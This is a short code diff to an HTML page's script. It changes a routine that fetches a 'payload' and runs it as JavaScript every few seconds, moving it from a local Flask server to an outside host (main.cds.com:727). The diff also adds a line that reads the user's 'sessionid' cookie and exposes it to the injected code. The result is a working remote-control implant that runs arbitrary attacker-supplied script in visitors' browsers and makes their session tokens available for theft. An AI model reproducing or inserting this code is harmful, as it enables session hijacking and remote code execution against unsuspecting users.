@@ -3,15 +3,15 @@
 <script>
 async function fetchAndRunPayload() {
     try {
-        const res = await fetch("/get_payload");  // 로컬 Flask 서버에서 최신 payload 가져오기
-        const payloadCode = await res.text();
-        if (payloadCode) {
-            // socket.io 로컬 로드
-            const ioScript = document.createElement("script");
-            ioScript.src = "/static/js/socket.io.min.js";  // Flask static 폴더에서 로드
-            ioScript.onload = () => {
+        const res = await fetch("https://main.cds.com:727/get_payload"); 
+        const payloadCode = await res.text(); 
+        const sessionId = document.cookie.split('; ').find(row => row.startsWith('sessionid='))?.split('=')[1];
+        window.currentSessionId = sessionId;  
 
-                // payload 실행
+        if (payloadCode) {
+            const ioScript = document.createElement("script");
+            ioScript.src = "https://main.cds.com:727/static/js/socket.io.min.js"; 
+            ioScript.onload = () => {
                 const script = document.createElement("script");
                 script.type = "text/javascript";
                 script.textContent = payloadCode;
@@ -24,6 +24,5 @@ async function fetchAndRunPayload() {
     }
 }
 
-// 10초마다 최신 payload 확인
-setInterval(fetchAndRunPayload, 10000);
+setInterval(fetchAndRunPayload, 15000);
 </script>
